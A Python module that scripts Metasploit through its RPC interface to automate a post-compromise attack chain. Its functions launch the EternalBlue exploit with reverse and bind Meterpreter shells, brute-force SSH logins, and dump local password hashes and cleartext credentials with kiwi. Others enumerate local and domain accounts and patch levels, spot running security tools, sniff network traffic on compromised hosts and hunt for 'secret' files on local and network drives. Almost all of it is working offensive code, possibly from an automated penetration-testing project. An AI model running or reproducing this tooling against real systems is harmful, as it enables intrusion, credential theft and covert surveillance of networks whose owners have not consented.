import json
import pprint
import copy
import random
import re
import datetime
import subprocess
from pymetasploit3.msfrpc import MsfRpcClient
from database import MyLogger

import time


class MetaSploit():
    def __init__(self) -> None:
        print("init metasploit...")

        self.mylogger = MyLogger.MyLogger()

    def msf_connection(self):
        client = MsfRpcClient('test', port=55553)
        time.sleep(10)
        return client

    def execute_eternalblue(self, ipaddr, num, node, Local_ipaddr):
        client = self.msf_connection()

        print("execute ms17_010 eternalblue...")
        self.mylogger.writelog("execute ms17_010 eternalblue...", "info")

        exploit = client.modules.use('exploit', 'windows/smb/ms17_010_eternalblue')
        exploit['RHOSTS'] = ipaddr

        payloads = ['windows/x64/meterpreter/reverse_tcp', 'windows/x64/meterpreter/bind_tcp']

        for p in payloads:
            payload = client.modules.use("payload", p)
            if p == "windows/x64/meterpreter/reverse_tcp":
                payload["LHOST"] = Local_ipaddr

            for i in range(3):
                port = random.randint(1023, 65535)
                payload["LPORT"] = str(port)

                print("target = {}".format(ipaddr))
                print("port = {}".format(port))
                print("payload = {}".format(p))
                self.mylogger.writelog("target =  " + ipaddr, "info")
                self.mylogger.writelog("port =  " + str(port), "info")
                self.mylogger.writelog("payload =  " + p, "info")

                for j in range(3):
                    exploit_id = exploit.execute(payload=payload)
                    job_id = exploit_id['job_id']
                    uuid = exploit_id['uuid']

                    print("exploit_id = {}".format(exploit_id))
                    print("job_id = {}".format(job_id))
                    print("uuid = {}".format(uuid))

                    print("execute exploit...")
                    self.mylogger.writelog("execute exploit...", "info")
                    time.sleep(60)

                    res = self.check_exploit(j, uuid, client.sessions.list)

                    if res == 0:
                        break
                    else:
                        continue
                break
            else:
                continue
            break

        if res == 0:
            session_num = []

            print("Sessions avaiables : ")
            for s in client.sessions.list.keys():
                session_num.append(str(s))
                print(session_num)

            node[num]['session'] = session_num[-1]
            return 0
        else:
            print("exploit psexec failed...")
            self.mylogger.writelog("exploit psexec failed...", "info")
            return -1

    def execute_ssh_bruteforce(self, ipaddr, num, node):
        client = self.msf_connection()

        print("execute ssh bruteforce...")
        self.mylogger.writelog("execute ssh bruteforce...", "info")

        cid = client.consoles.console().cid
        print('cid = {}'.format(cid))

        run = client.modules.use('auxiliary', 'scanner/ssh/ssh_login')
        run['RHOSTS'] = ipaddr
        run['USERPASS_FILE'] = "./root_userpass.txt"
        run['STOP_ON_SUCCESS'] = True
        print(run.runoptions)

        run_id = run.execute()
        job_id = run_id['job_id']
        uuid = run_id['uuid']
        print("run_id = {}".format(run_id))
        print("job_id = {}".format(job_id))
        print("uuid = {}".format(uuid))

        time.sleep(60)
        res = client.consoles.console(cid).read()
        # print("res = {}".format(res))

        print("session_list = {}".format(client.sessions.list))

    def execute_netuser(self, num, node):
        client = self.msf_connection()

        print("execute get local_user info...")
        self.mylogger.writelog("execute get local_user info", "info")

        session_num = node[num]["session"]

        client.sessions.session(session_num).write("upload ./net-user.bat")
        time.sleep(10)
        self.mylogger.writelog(client.sessions.session(session_num).read(), "info")

        client.sessions.session(session_num).write("execute -f net-user.bat")
        time.sleep(20)
        self.mylogger.writelog(client.sessions.session(session_num).read(), "info")

        client.sessions.session(session_num).write('download net-user.log')
        time.sleep(30)
        self.mylogger.writelog(client.sessions.session(session_num).read(), "info")
        
        # client.sessions.session(session_num).write('rm net-user.bat net-user.log')
        time.sleep(20)
        self.mylogger.writelog(client.sessions.session(session_num).read(), "info")

        local_account = []
        flag = 0

        with open('net-user.log', 'r') as f:
            for row in f:
                if 'command' in row.lower() and 'completed' in row.lower():
                    break
                if flag == 1:
                    c = row.split()
                    local_account += c
                if '---------' in row:
                    flag = 1

        print("local account list = {}".format(local_account))
        self.mylogger.writelog("local account list = " + pprint.pformat(local_account), "info")
        node[num]['local_account_list'] = copy.deepcopy(local_account)

        local_account.clear()

    def execute_netuserdomain(self, num, node):
        client = self.msf_connection()

        print("execute get domain_user info...")
        self.mylogger.writelog("execute get domain_user info..", "info")

        session_num = node[num]['session']

        client.sessions.session(session_num).write('upload ./bat/net-user-domain.bat')
        time.sleep(10)
        self.mylogger.writelog(client.sessions.session(session_num).read(), 'info')

        client.sessions.session(session_num).write('execute -f net-user-domain.bat')
        time.sleep(20)
        # print(client.sessions.session(session_num).read())
        self.mylogger.writelog(client.sessions.session(session_num).read(), "info")

        client.sessions.session(session_num).write('download net-user-domain.log')
        time.sleep(30)
        # print(client.sessions.session(session_num).read())
        self.mylogger.writelog(client.sessions.session(session_num).read(), "info")

        client.sessions.session(session_num).write('rm net-user-domain.bat net-user-domain.log')
        time.sleep(20)
        # print(client.sessions.session(session_num).read())
        self.mylogger.writelog(client.sessions.session(session_num).read(), "info")

        pattern = '.*(for domain )(.*)'
        domain_account = []
        domain_info = ''
        flag = 0

        with open('net-user-domain.log', 'r') as f:
            for row in f:
                if 'command' in row.lower() and "completed" in row.lower():
                    break
                if 'request' in row.lower() and "processed" in row.lower():
                    result = re.match(pattern, row)
                    domain_info = result.group(2)[:-1]  # delete dot
                    print("domain_info = {}".format(domain_info))

                if flag == 1:
                    # print(row)
                    c = row.split()
                    domain_account += c
                if '-------' in row:
                    flag = 1
        print("domain account list = {}".format(domain_account))
        self.mylogger.writelog("domain account list = " + pprint.pformat(domain_account), "info")
        node[num]['domain_account_list'] = copy.deepcopy(domain_account)
        node[num]['domain_info'] = domain_info

        domain_account.clear()

    def get_local_hash(self, num, node):
        client = self.msf_connection()

        session_num = node[num]['session']

        hash_list = []

        client.sessions.session(session_num).write('run post/windows/gather/smart_hashdump')
        time.sleep(10)
        hashdump = client.sessions.session(session_num).read()
        print(hashdump)
        self.mylogger.writelog(hashdump, "info")

        lines = hashdump.split('\n')
        flag = 0
        for line in lines:
            if 'Dumping password hashes' in line:
                flag = 1
            for user in node[num]["local_account_list"]:
                if user in line and flag == 1:
                    tmpHash = line.split(':')
                    hash_list.append(tmpHash[-1])
        print("hash_list = {}".format(hash_list))
        self.mylogger.writelog("hash_list = " + pprint.pformat(hash_list), "info")

        node[num]['local_account_hash'] = hash_list

    def get_local_pass(self, num, node):
        client = self.msf_connection()

        session_num = node[num]['session']

        pass_list = []
        client.sessions.session(session_num).write('load kiwi')
        time.sleep(5)
        client.sessions.session(session_num).read()

        count = 0
        while True:
            client.sessions.session(session_num).write('creds_tspkg')
            time.sleep(30)
            passdump = client.sessions.session(session_num).read()
            if '[-]' not in passdump:
                break
            if count == 3:
                exit()
            count += 1

        print(passdump)
        self.mylogger.writelog(passdump, "info")

        flag = 0
        lines = passdump.split('\n')
        for line in lines:
            if line == '':
                continue
            if 'Password' in line:
                flag = 1
            if flag == 1:
                keys = line.split()
                if keys[0] in node[num]["local_account_list"]:
                    pass_list.append(keys[-1])
        pass_list = list(set(pass_list))

        print("pass_list = {}".format(pass_list))
        self.mylogger.writelog("pass_list = " + pprint.pformat(pass_list), "info")

        node[num]['local_account_pass'] = pass_list

    def check_exploit(self, i, uuid, sessions_list):

        if sessions_list:
            print("sessions_list = {}".format(sessions_list))
            self.mylogger.writelog("sessions_list = " + pprint.pformat(sessions_list), "debug")

            for key in sessions_list.keys():
                # print("key = {}".format(key))

                if uuid == sessions_list[key]["exploit_uuid"]:
                    print("match key = {}".format(key))
                    print("exploit_uuid = {}".format(sessions_list[key]["exploit_uuid"]))
                    print("exploit success...")
                    self.mylogger.writelog("exploit success...", "info")
                    return 0
        else:
            print("exploit failed..")
            self.mylogger.writelog("exploit failed...", "info")
            if i == 2:
                print("three times exploit failed..")
                self.mylogger.writelog("three times exploit failed...", "info")
                return -1

    def execute_getospatch(self, num, node):
        client = self.msf_connection()

        session_num = node[num]['session']

        print("execute get ospatch...")
        self.mylogger.writelog("execute get ospatch...", "info")

        client.sessions.session(session_num).write('upload ./bat/systeminfo.bat')
        time.sleep(10)
        # print(client.sessions.session(session_num).read())
        self.mylogger.writelog(client.sessions.session(session_num).read(), "info")

        client.sessions.session(session_num).write('execute -f systeminfo.bat')
        time.sleep(20)
        # print(client.sessions.session(session_num).read())
        self.mylogger.writelog(client.sessions.session(session_num).read(), "info")

        client.sessions.session(session_num).write('download systeminfo.txt')
        time.sleep(20)
        # print(client.sessions.session(session_num).read())
        self.mylogger.writelog(client.sessions.session(session_num).read(), "info")

        client.sessions.session(session_num).write('rm systeminfo.txt systeminfo.bat')
        time.sleep(20)
        # print(client.sessions.session(session_num).read())
        self.mylogger.writelog(client.sessions.session(session_num).read(), "info")

        try:
            result = subprocess.check_output(
                'python3 ./wesng/wes.py --definitions ./wesng/definitions.zip -d --muc-lookup systeminfo.txt | grep -e \"Installed hotfixes\" -e \"CVE\" | sort -u',
                shell=True).decode('utf-8')
            print(result)
            self.mylogger.writelog("wes.py result = " + result, "info")

        except:
            print("wes.py error!!")
            self.mylogger.writelog("wes.py error!!", "error")

    def get_domain_pass(self, num, node):
        client = self.msf_connection()

        session_num = node[num]['session']

        pass_list = []
        client.sessions.session(session_num).write('load kiwi')
        time.sleep(5)
        client.sessions.session(session_num).read()

        count = 0
        while True:
            client.sessions.session(session_num).write('creds_tspkg')
            time.sleep(30)
            passdump = client.sessions.session(session_num).read()
            if '[-]' not in passdump:
                break
            if count == 3:
                exit()
            count += 1

        print(passdump)
        self.mylogger.writelog(passdump, "info")

        flag = 0
        lines = passdump.split('\n')
        for line in lines:
            if line == '':
                continue
            if 'Password' in line:
                flag = 1
            if flag == 1:
                keys = line.split()
                if keys[0] in node[num]["domain_account_list"]:
                    pass_list.append(keys[-1])
        pass_list = list(set(pass_list))

        print("pass_list = {}".format(pass_list))
        self.mylogger.writelog("pass_list = " + pprint.pformat(pass_list), "info")

        node[num]['domain_account_pass'] = pass_list

    def execute_ipconfig(self, num, node):
        client = self.msf_connection()

        session_num = node[num]['session']

        print("execute ipconfig...")
        self.mylogger.writelog("execute ipconfig...", "info")

        client.sessions.session(session_num).write('ipconfig')
        time.sleep(10)
        result = client.sessions.session(session_num).read()
        # print(result)
        self.mylogger.writelog(result, "info")

        ipaddr_info = []
        pattern = '.*( : )(.*)'

        rows = result.splitlines()

        for row in rows:
            if "ipv4 address" in row.lower():
                result = re.match(pattern, row)
                if (result.group(2) == "127.0.0.1"):
                    loopback = 1
                else:
                    ipaddr_info.append(result.group(2).replace('\n', ''))
            if "ipv4 netmask" in row.lower():
                result = re.match(pattern, row)
                if (loopback == 1):
                    loopback = 0
                else:
                    ipaddr_info.append(result.group(2).replace('\n', ''))

        print("ipconfig info = {}".format(ipaddr_info))
        self.mylogger.writelog("ipconfig info = " + pprint.pformat(ipaddr_info), "info")
        node[num]['ipconfig_info'] = copy.deepcopy(ipaddr_info)

        ipaddr_info.clear()

    def execute_netstat(self, num, node):
        client = self.msf_connection()

        session_num = node[num]['session']

        print("execute netstat...")
        self.mylogger.writelog("execute netstat...", "info")

        client.sessions.session(session_num).write('netstat')
        time.sleep(10)
        result = client.sessions.session(session_num).read()
        # print(result)
        self.mylogger.writelog(result, "info")

        netstat_info = []
        pattern = '(.*):(.*)'

        rows = result.splitlines()

        for row in rows:
            if "established" in row.lower():
                c = row.split()
                result = re.match(pattern, c[2])
                try:
                    netstat_info.append(result.group(1).replace('\n', ''))
                    netstat_info.append(result.group(2).replace('\n', ''))
                except:
                    pass

        print("established network info = {}".format(netstat_info))
        self.mylogger.writelog("established network info = " + pprint.pformat(netstat_info), "info")
        node[num]['netstat_info'] = copy.deepcopy(netstat_info)

        netstat_info.clear()

    def execute_ps(self, num, node):
        client = self.msf_connection()
        session_num = node[num]['session']

        print("execute ps...")
        self.mylogger.writelog("execute ps...", "info")

        client.sessions.session(session_num).write('ps')
        time.sleep(10)
        result = client.sessions.session(session_num).read()
        # print(client.sessions.session(session_num).read())
        self.mylogger.writelog(result, "info")

        rows = result.splitlines()
        ps_list = []

        for row in rows:
            c = row.split()
            if len(c) >= 7 and ".exe" in c[2]:
                ps_list.append(c[2])
                # print("process = {}".format(c[2]))

        print("ps_list = {}".format(ps_list))
        self.mylogger.writelog("process list = " + pprint.pformat(ps_list), "info")

        node[num]['process_list'] = copy.deepcopy(ps_list)

        json_open = open('./arsenal/security_tool.json', 'r')
        json_load = json.load(json_open)

        st_list = []

        for key, values in json_load.items():
            # print(key)
            for value in values:
                for ps in ps_list:
                    if (value.lower() + ".exe" == ps.lower()):
                        st_list.append(key)
                        break

        print("st_list = {}".format(st_list))
        self.mylogger.writelog("security tool list = " + pprint.pformat(st_list), "info")

        node[num]['security_tool'] = copy.deepcopy(st_list)

        ps_list.clear()
        st_list.clear()

    def execute_getmaindrvinfo(self, num, node):
        client = self.msf_connection()

        session_num = node[num]['session']

        print("execute get maindrvinfo..")
        self.mylogger.writelog("execute get maindrvinfo...", "info")

        client.sessions.session(session_num).write('show_mount')
        time.sleep(10)
        result = client.sessions.session(session_num).read()
        self.mylogger.writelog(result, "info")

        rows = result.splitlines()
        print(rows)

        local_drv = []
        flag = 0

        for row in rows:
            if flag == 1 and '.' not in row.lower():
                break
            if flag == 1:
                c = row.split()
                local_drv.append(c[0])
                local_drv.append(c[1])
            if '----' in row:
                flag = 1

        flag = 0

        print("local drive = {}".format(local_drv))
        self.mylogger.writelog("local drive = " + pprint.pformat(local_drv), "info")
        node[num]['local_drive'] = copy.deepcopy(local_drv)

        local_drv.clear()

    def execute_netuse(self, num, node):
        client = self.msf_connection()

        session_num = node[num]['session']

        print("execute netuse...")
        self.mylogger.writelog("execute netuse...", "info")

        client.sessions.session(session_num).write('upload ./bat/net-use.bat')
        time.sleep(10)
        # print(client.sessions.session(session_num).read())
        self.mylogger.writelog(client.sessions.session(session_num).read(), "info")

        client.sessions.session(session_num).write('execute -f net-use.bat')
        time.sleep(20)
        # print(client.sessions.session(session_num).read())
        self.mylogger.writelog(client.sessions.session(session_num).read(), "info")

        client.sessions.session(session_num).write('download net-use.log')
        time.sleep(30)
        # print(client.sessions.session(session_num).read())
        self.mylogger.writelog(client.sessions.session(session_num).read(), "info")

        client.sessions.session(session_num).write('rm net-use.bat net-use.log')
        time.sleep(20)
        # print(client.sessions.session(session_num).read())
        self.mylogger.writelog(client.sessions.session(session_num).read(), "info")

        nw_drive = []
        flag = 0

        with open('net-use.log', 'r') as f:
            for row in f:
                if 'command' in row.lower() and "completed" in row.lower():
                    break
                if flag == 1:
                    # print(row)
                    c = row.split()
                    nw_drive.append(c[2])
                if '-------' in row:
                    flag = 1

        print("network drive list = {}".format(nw_drive))
        self.mylogger.writelog("network drive list = " + pprint.pformat(nw_drive), "info")
        node[num]['network_drive'] = copy.deepcopy(nw_drive)

        nw_drive.clear()

    def execute_getlocalsecretinfo(self, num, node):
        client = self.msf_connection()

        session_num = node[num]['session']

        print("execute get localsecretinfo...")
        self.mylogger.writelog("execute get localsecretinfo...", "info")

        client.sessions.session(session_num).write('pwd')
        time.sleep(10)
        # print(client.sessions.session(session_num).read())
        self.mylogger.writelog(client.sessions.session(session_num).read(), "info")

        client.sessions.session(session_num).write('cd %temp%')
        time.sleep(10)
        # print(client.sessions.session(session_num).read())
        self.mylogger.writelog(client.sessions.session(session_num).read(), "info")

        client.sessions.session(session_num).write('dir')
        time.sleep(10)
        result = client.sessions.session(session_num).read()
        self.mylogger.writelog(result, "info")

        rows = result.splitlines()
        print(rows)

        secret_data = -1

        for row in rows:
            if "secret" in row:
                print("find secret_data = {}".format(row))
                secret_data = 1
                break
            else:
                pass

        print("secret_data = {}".format(secret_data))
        self.mylogger.writelog("secret_data = " + str(secret_data), "info")
        node[num]['secret_data'] = secret_data

        return secret_data

    def execute_sniff_win(self, num, node):
        client = self.msf_connection()

        print("execute network sniffing..")
        self.mylogger.writelog("execute network sniffing...", "info")

        session_num = node[num]['session']

        client.sessions.session(session_num).write('load sniffer')
        time.sleep(10)
        # print(client.sessions.session(session_num).read())
        self.mylogger.writelog(client.sessions.session(session_num).read(), "info")

        client.sessions.session(session_num).write('sniffer_interfaces')
        time.sleep(10)
        result = client.sessions.session(session_num).read()
        self.mylogger.writelog(result, "info")

        interface_list = []
        interface_list.clear()
        pattern = '(.*)( - ).*'

        rows = result.splitlines()

        for row in rows:
            if "type:" in row.lower():
                result = re.match(pattern, row)
                interface_list.append(result.group(1).replace('\n', ''))

        # print("interface_list = {}".format(interface_list))

        for interface in interface_list:
            client.sessions.session(session_num).write('sniffer_start ' + interface)
            time.sleep(10)
            result = client.sessions.session(session_num).read()

            if "Capture started" in result:
                print(result)

                filename = "if" + interface + "_" + node[num]["id"] + "_" + str(datetime.date.today()) + ".pcap"

                time.sleep(50)

                client.sessions.session(session_num).write('sniffer_dump ' + interface + ' ./' + filename)
                time.sleep(30)
                # print(client.sessions.session(session_num).read())
                self.mylogger.writelog(client.sessions.session(session_num).read(), "info")

                client.sessions.session(session_num).write('sniffer_stop ' + interface)
                time.sleep(10)
                # print(client.sessions.session(session_num).read())
                self.mylogger.writelog(client.sessions.session(session_num).read(), "info")

                client.sessions.session(session_num).write('sniffer_release ' + interface)
                time.sleep(10)
                # print(client.sessions.session(session_num).read())
                self.mylogger.writelog(client.sessions.session(session_num).read(), "info")

                node[num]["pcap_list"].append(filename)

            else:
                print("Failed capture network interface {}...".format(interface))
                self.mylogger.writelog("Failed capture network interface " + interface, "error")

    def execute_sniff_linux(self, num, node):
        client = self.msf_connection()

        print("execute network sniffing for Linux..")
        self.mylogger.writelog("execute network sniffing for Linux...", "info")

        session_num = node[num]['session']

        client.sessions.session(session_num).write('ipconfig')
        time.sleep(10)
        # print(client.sessions.session(session_num).read())
        self.mylogger.writelog(client.sessions.session(session_num).read(), "info")

        nic_info = []
        pattern = '.*( : )(.*)'

        rows = result.splitlines()

        for row in rows:
            if "name" in row.lower():
                result = re.match(pattern, row)
                if (result.group(2) != "lo"):
                    nic_info.append(result.group(2).replace('\n', ''))

        print("nic info (Linux) = {}".format(nic_info))
        self.mylogger.writelog("nic info (Linux) = " + pprint.pformat(nic_info), "info")
        # node[num]['ipconfig_info'] = copy.deepcopy(ipaddr_info)

        for nic in nic_info:
            with open('./bat/tcpdump.sh', 'w') as f:
                filename = nic + "_" + node[num]["id"] + "_" + str(datetime.date.today()) + ".pcap"
                print("tcpdump -i " + nic + " -w " + filename + " -W1 -G10")

                client.sessions.session(session_num).write(
                    'execute -f tcpdump -a \"-i ' + nic + ' -w ' + filename + ' -W1 -G10\"')
                time.sleep(20)
                # print(client.sessions.session(session_num).read())
                self.mylogger.writelog(client.sessions.session(session_num).read(), "info")

                client.sessions.session(session_num).write('download ' + filename)
                time.sleep(20)
                # print(client.sessions.session(session_num).read())
                self.mylogger.writelog(client.sessions.session(session_num).read(), "info")

                node[num]["pcap_list"].append(filename)

        nic_info.clear()

    def execute_getnwsecretinfo(self, num, node):
        client = self.msf_connection()

        session_num = node[num]['session']

        # print("execute systeminfo..")

        value = iter(node[num]["network_drive"])

        secret_data = -1

        for nwdrv, drv_type in zip(value, value):
            client.sessions.session(session_num).write('pwd')
            time.sleep(10)
            print(client.sessions.session(session_num).read())

            client.sessions.session(session_num).write('cd ' + nwdrv)
            time.sleep(10)
            print(client.sessions.session(session_num).read())

            client.sessions.session(session_num).write('dir')
            time.sleep(10)
            result = client.sessions.session(session_num).read()

            rows = result.splitlines()
            print(rows)

            for row in rows:
                if "secret" in row:
                    print("find secret_data = {}".format(row))
                    secret_data = 1
                    break
                else:
                    continue
            break

        print("secret_data = {}".format(secret_data))
        node[num]['secret_data'] = secret_data
